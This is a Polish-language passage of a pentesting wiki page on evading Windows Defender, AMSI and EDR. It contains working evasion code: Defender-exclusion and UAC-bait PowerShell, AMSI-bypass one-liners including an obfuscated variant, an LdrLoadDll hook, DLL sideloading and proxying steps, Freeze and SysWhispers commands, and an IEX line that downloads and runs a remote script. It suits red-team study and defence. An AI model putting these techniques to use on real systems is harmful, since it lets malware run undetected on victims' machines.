# Omijanie antywirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymaj Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymywania działania Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymywania działania Windows Defendera przez podszywanie się pod inny AV.
- [Wyłącz Defendera, jeśli jesteś administratorem](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed ingerencją w Defendera

Publiczne loadery podszywające się pod cheaty do gier często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podwyższenie uprawnień**, a dopiero potem wyłączają Defendera. Przebieg jest prosty:

1. Sprawdź, czy proces działa z uprawnieniami administratora, za pomocą `net session`. To polecenie powiedzie się tylko wtedy, gdy uruchamiający je ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie sam siebie z czasownikiem `RunAs`, aby wywołać oczekiwany monit UAC o zgodę, zachowując oryginalny wiersz poleceń.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary i tak wierzą, że instalują „crackowane” oprogramowanie, więc zwykle akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` dla każdej litery dysku

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoadera maksymalizują martwe pola Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw zabija proces nadzorujący GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, przez co skanowanie staje się niemożliwe dla każdego profilu użytkownika, katalogu systemowego i dysku wymiennego:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itp.), więc **każdy przyszły payload umieszczony gdziekolwiek na dysku zostanie zignorowany**.
- Wykluczenie rozszerzenia `.sys` jest przygotowaniem na przyszłość — atakujący zachowują możliwość późniejszego ładowania niepodpisanych sterowników bez ponownego ingerowania w Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole stanu nadal zgłaszają, że „antywirus jest aktywny”, mimo że inspekcja w czasie rzeczywistym nie obejmuje tych ścieżek.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Obecnie programy antywirusowe stosują różne metody sprawdzania, czy plik jest złośliwy: wykrywanie statyczne, analizę dynamiczną, a w przypadku bardziej zaawansowanych EDR-ów także analizę behawioralną.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów znaków lub tablic bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itp.). Oznacza to, że korzystanie ze znanych, publicznych narzędzi może sprawić, że łatwiej zostaniesz wykryty, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na ominięcie tego rodzaju wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów znaków w pliku binarnym lub skrypcie, aby ominąć AV, ale w zależności od tego, co próbujesz poddać obfuskacji, może to być czasochłonne.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istnieć znane złośliwe sygnatury, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzania, czy Windows Defender wykrywa plik statycznie, jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli ono plik na wiele segmentów i zleca Defenderowi skanowanie każdego z nich osobno. Dzięki temu może wskazać dokładnie, które ciągi znaków lub bajty w pliku binarnym zostały oznaczone.

Gorąco polecam zapoznać się z tą [playlistą na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznym technikom AV Evasion.

### Testy cech PE dla klasyfikatorów statycznych w trybie offline

Bajty spakowanego lub zaszyfrowanego payloadu to tylko jeden z danych wejściowych klasyfikatora statycznego. EMBER2024 wyodrębnia cechy PE, w tym importy, eksporty, sekcje, nagłówki i dane Authenticode.<sup>[[48]](#references)</sup> W jednym eksperymencie z loaderem dodanie 141 importów wyglądających na nieszkodliwe obniżyło wynik złośliwości EMBER2024 o 93%, podczas gdy importy powiązane ze złośliwym oprogramowaniem go podniosły. Jest to wynik uzyskany dla tego modelu i tych próbek, a nie niezawodna metoda omijania konkretnego produktu AV/EDR.<sup>[[50]](#references)</sup>

W autoryzowanym teście loadera nie zmieniaj payloadu ani ścieżki wykonania, zmieniaj tylko jedną zamierzoną zmienną kompilacji dla każdego wariantu i porównuj wyniki offline. Sprawdź uzyskane cechy PE, ponieważ zmiana kompilacji może wpłynąć na więcej niż jedną grupę cech.<sup>[[49]](#references)[[50]](#references)</sup> Aby zachować zamierzone importy w IAT, wywołuj wybrane API Win32 z osiągalnego kodu. Zmieniaj wybór API i rozkładaj miejsca wywołań między kompilacjami, zamiast tworzyć stałą funkcję kamuflującą, która może stać się sygnaturą. Eksperyment wykazał również niższe wyniki przy prawidłowym podpisywaniu kodu, wpisach eksportów i większej liczbie funkcji powiększających `.pdata`; nieprawidłowy podpis miał niewielki wpływ, a efekt związany z `.pdata` był mały.<sup>[[50]](#references)</sup>

Pakiet `thrember` udostępnia ekstrakcję cech i modele porównawcze. Po jego zainstalowaniu użyj `thrember.download_models("models")` z istniejącym katalogiem `models`, a następnie uruchom moduł oceniający z katalogu nadrzędnego: funkcja pomocnicza pobierająca modele zmienia bieżący katalog roboczy. Klasyfikator PE może oceniać katalog zawierający kompilacje bez przesyłania ich do usługi skanującej:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Podczas porównania używaj zawsze tych samych wersji modelu i ekstraktora cech. Niższy wynik offline pokazuje jedynie, jak ten klasyfikator reaguje na zmieniony plik binarny; nie dowodzi, że udało się uniknąć analizy behawioralnej, emulacji ani innego modelu dostawcy.<sup>[[49]](#references)[[50]](#references)</sup> Informacje o [polimorfizmie per kompilacja i kamuflażu zewnętrznego pliku binarnego w zwirtualizowanych payloadach](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) znajdziesz w osobnym modelu wykonania.

### **Analiza dynamiczna**

Analiza dynamiczna polega na tym, że AV uruchamia twój plik binarny w sandboxie i obserwuje złośliwą aktywność (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itp.). Ta część może być nieco trudniejsza, ale oto kilka sposobów na uniknięcie sandboxów.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AV ma bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie opóźnienia mogą utrudnić analizę plików binarnych. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć uśpienie, zależnie od jego implementacji.
- **Sprawdzanie zasobów maszyny** Sandboxy mają zwykle do dyspozycji bardzo niewiele zasobów (np. < 2 GB RAM), bo w przeciwnym razie mogłyby spowalniać komputer użytkownika. Możesz też wykazać się kreatywnością, na przykład sprawdzając temperaturę CPU, a nawet prędkość wentylatorów — sandbox może nie obsługiwać wszystkich takich funkcji.
- **Kontrole specyficzne dla maszyny** Jeśli chcesz zaatakować użytkownika, którego stacja robocza należy do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją z określoną przez siebie. Jeśli się nie zgadza, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH. Możesz więc sprawdzić nazwę komputera w malware przed detonacją. Jeśli nazwa to HAL9TH, oznacza to, że znajdujesz się w sandboxie Defendera, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Oto kilka innych świetnych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących działania przeciwko sandboxom.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy w tym wpisie, **publiczne narzędzia** prędzej czy później **zostaną wykryte**, więc warto zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz użyć innego, mniej znanego projektu, który również zrzuca LSASS?

Prawdopodobnie właściwa jest ta druga opcja. Weźmy mimikatz za przykład: to prawdopodobnie jeden z najczęściej wykrywanych, jeśli nie najczęściej wykrywany, programów malware przez AV i EDR. Sam projekt jest świetny, ale trudno go używać do omijania AV, więc po prostu poszukaj alternatyw dla tego, co chcesz osiągnąć.

> [!TIP]
> Modyfikując payloady w celu uniknięcia wykrycia, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze. I proszę, naprawdę **NIE PRZESYŁAJ PLIKÓW DO VIRUSTOTAL**, jeśli chcesz długofalowo uniknąć wykrycia. Jeśli chcesz sprawdzić, czy konkretny AV wykrywa twój payload, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz zadowalający wynik.

## EXEs vs DLLs

Jeśli to możliwe, zawsze **stawiaj na DLL w celu uniknięcia wykrycia**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane i analizowane**, więc w niektórych przypadkach jest to prosty sposób na uniknięcie wykrycia (oczywiście jeśli twój payload może działać jako DLL).

Jak widać na tym obrazie, współczynnik wykrywalności payloadu DLL z Havoc wynosi 4/26 w antiscan.me, podczas gdy payloadu EXE — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie na antiscan.me zwykłego payloadu Havoc EXE ze zwykłą biblioteką Havoc DLL</p></figcaption></figure>

Pokażemy teraz kilka sztuczek, które pozwolą ci znacznie skuteczniej ukrywać pliki DLL.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL stosowaną przez loadera. Polega na umieszczeniu aplikacji ofiary i złośliwych payloadów obok siebie.

Możesz wyszukiwać programy podatne na DLL Sideloading za pomocą [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL hijacking w katalogu „C:\Program Files\\” oraz plików DLL, które próbują załadować.

Gorąco polecam **samodzielnie sprawdzić programy podatne na DLL Hijacking/Sideloading**. Ta technika, jeśli zostanie prawidłowo zastosowana, jest dość skryta, ale korzystając z publicznie znanych programów podatnych na DLL Sideloading, możesz łatwo wpaść.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, której program oczekuje, nie spowoduje załadowania Twojego payloadu, ponieważ program oczekuje, że biblioteka DLL będzie zawierać określone funkcje. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania wykonywane przez program z biblioteki proxy (i złośliwej) DLL do oryginalnej biblioteki DLL, zachowując w ten sposób funkcjonalność programu i umożliwiając obsługę wykonania Twojego payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL i oryginalną DLL o zmienionej nazwie.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wskaźnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Zdecydowanie polecam** obejrzeć [VOD S3cur3Th1sSh1t na Twitchu](https://www.twitch.tv/videos/1644171543) o DLL Sideloading, a także [film ippseca](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dokładniej poznać omawiane zagadnienia.

### Abusing Forwarded Exports (ForwardSideLoading)

Moduły PE systemu Windows mogą eksportować funkcje, które w rzeczywistości są „forwarderami”: zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący odwołuje się do eksportu, loader systemu Windows:

- Załaduje `TargetDll`, jeśli nie jest jeszcze załadowany
- Znajdzie w nim `TargetFunc`

Ważne zachowania:
- Jeśli `TargetDll` jest KnownDLL, zostanie załadowany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, stosowana jest standardowa kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego przekazywanie.

Umożliwia to pośrednie wykorzystanie sideloadingu: znajdź podpisaną DLL, która eksportuje funkcję przekazywaną do modułu o nazwie niebędącej KnownDLL, a następnie umieść w tym samym katalogu kontrolowaną przez atakującego DLL o nazwie identycznej z nazwą modułu docelowego. Gdy zostanie wywołany przekazywany eksport, loader rozwiąże przekazanie i załaduje Twoją DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwany zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z prawem zapisu.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalna funkcja DllMain wystarczy, aby uruchomić kod; nie musisz implementować przekazywanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Uruchom forward za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane zachowanie:
- rundll32 (podpisany) ładuje side-by-side `keyiso.dll` (podpisany)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące wyszukiwania:
- Skup się na przekierowanych eksportach, których moduł docelowy nie jest KnownDLL. KnownDLL są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć przekierowane eksporty za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie i obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL z lokalizacji innych niż systemowe, a następnie ładujące z tego katalogu pliki niebędące KnownDLLs o tej samej nazwie bazowej
- Generuj alerty dotyczące łańcuchów procesów/modułów, takich jak: `rundll32.exe` → niesystemowy `keyiso.dll` → `NCRYPTPROV.dll` w lokalizacjach z prawem zapisu dla użytkownika
- Wymuszaj zasady integralności kodu (WDAC/AppLocker) i zabraniaj jednoczesnego zapisu i wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi do obsługi payloadów, służący do omijania EDR-ów przy użyciu zawieszonych procesów, bezpośrednich syscalli i alternatywnych metod wykonywania`

Możesz użyć Freeze, aby potajemnie załadować i uruchomić swój shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to nieustanna gra w kotka i myszkę — to, co działa dziś, jutro może zostać wykryte, dlatego nigdy nie polegaj tylko na jednym narzędziu. Jeśli to możliwe, łącz ze sobą wiele technik evasion.

## Direct/Indirect Syscalls i rozwiązywanie SSN (SysWhispers4)

EDR-y często zakładają **inline hooks w user-mode** na stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować stuby **direct** lub **indirect syscall**, które ładują prawidłowy **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania hookowanego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (osadzony)**: umieszcza instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (nie wywołuje eksportu `ntdll`).
- **Indirect**: wykonuje skok do istniejącego gadżetu `syscall` wewnątrz `ntdll`, dzięki czemu przejście do jądra wygląda, jakby pochodziło z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: unika osadzania statycznej sekwencji opcode `0F 05` na dysku; wyszukuje sekwencję syscall w czasie działania.

**Odporne na hooki strategie rozwiązywania SSN:**
- **FreshyCalls (sortowanie według VA)**: ustala SSN przez sortowanie stubów syscall według adresów wirtualnych zamiast odczytywania bajtów stubów.
- **SyscallsFromDisk**: mapuje czystą kopię `\KnownDlls\ntdll.dll`, odczytuje SSN z jej sekcji `.text`, a następnie ją odmapowuje (omija wszystkie hooki w pamięci).
- **RecycledGate**: łączy ustalanie SSN przez sortowanie według VA z walidacją opcode, gdy stub jest czysty; jeśli jest hookowany, przechodzi na ustalanie SSN według VA.
- **HW Breakpoint**: ustawia DR0 na instrukcji `syscall` i używa VEH do przechwycenia SSN z `EAX` w czasie działania, bez analizowania hookowanych bajtów.

Przykład użycia SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI stworzono, aby zapobiegać „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)”. Początkowo AV potrafił skanować tylko **pliki na dysku**, więc jeśli udało Ci się uruchomić payload **bezpośrednio w pamięci**, AV nie mógł temu zapobiec, ponieważ nie miał wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi składnikami systemu Windows:

- Kontrola konta użytkownika, czyli UAC (podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra Office VBA

Pozwala rozwiązaniom antywirusowym analizować zachowanie skryptów, udostępniając ich treść w postaci niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że dodaje prefiks `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy wykryci w pamięci dzięki AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również jest skanowany przez AMSI. Dotyczy to nawet użycia `Assembly.Load(byte[])` do załadowania kodu w pamięci. Dlatego do uruchamiania kodu w pamięci zaleca się używanie starszych wersji .NET (np. 4.7.2 lub starszej), jeśli chcesz uniknąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuskacja**

Ponieważ AMSI opiera się głównie na wykrywaniu statycznym, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak odwracać obfuskację skryptów, nawet jeśli mają wiele warstw, więc obfuskacja może być złą opcją — w zależności od sposobu jej zastosowania. Przez to uniknięcie wykrycia nie jest takie proste. Czasami jednak wystarczy zmienić kilka nazw zmiennych, aby uniknąć wykrycia, więc zależy to od tego, w jakim stopniu dana treść została oznaczona.

- **AMSI Bypass**

AMSI jest implementowane przez załadowanie biblioteki DLL do procesu PowerShell (a także cscript.exe, wscript.exe itd.), więc można łatwo manipulować tym mechanizmem nawet z poziomu nieuprzywilejowanego użytkownika. Ze względu na tę wadę w implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Wymuszenie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) sprawi, że w bieżącym procesie nie zostanie zainicjowane skanowanie. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec powszechnemu wykorzystywaniu tej metody.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczyła jedna linijka kodu PowerShell, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShell. Ta linijka została oczywiście wykryta przez samo AMSI, dlatego trzeba ją zmodyfikować, aby skorzystać z tej techniki.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że ten wpis prawdopodobnie zostanie wykryty po opublikowaniu, więc jeśli chcesz pozostać niewykrytym, nie publikuj żadnego kodu.

**Memory Patching**

Technika ta została pierwotnie odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami, które zwracają kod E_INVALIDARG. Dzięki temu wynik rzeczywistego skanowania wyniesie 0, co zostanie zinterpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) — znajdziesz tam bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik bypassowania AMSI w powershellu. Dowiedz się o nich więcej na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) i w [**tym repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidny, niezależny od języka bypass polega na założeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i w tym procesie nie są wykonywane żadne skany.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod C/C++ dla x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa w PowerShell, WScript/CScript i niestandardowych loaderach (we wszystkim, co w innym przypadku ładowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Zaobserwowano użycie w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypty omijające AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypty omijające AMSI, które unikają wykrycia przez sygnatury dzięki losowym, zdefiniowanym przez użytkownika funkcjom, zmiennym i wyrażeniom znakowym oraz losowej zmianie wielkości liter w słowach kluczowych PowerShell.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzi takich jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić:

```bash
powershell.exe -version 2
```

## Rejestrowanie PowerShell

Rejestrowanie PowerShell to funkcja, która pozwala zapisywać wszystkie polecenia PowerShell wykonywane w systemie. Może być przydatna do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć rejestrowanie PowerShell, możesz zastosować następujące techniki:

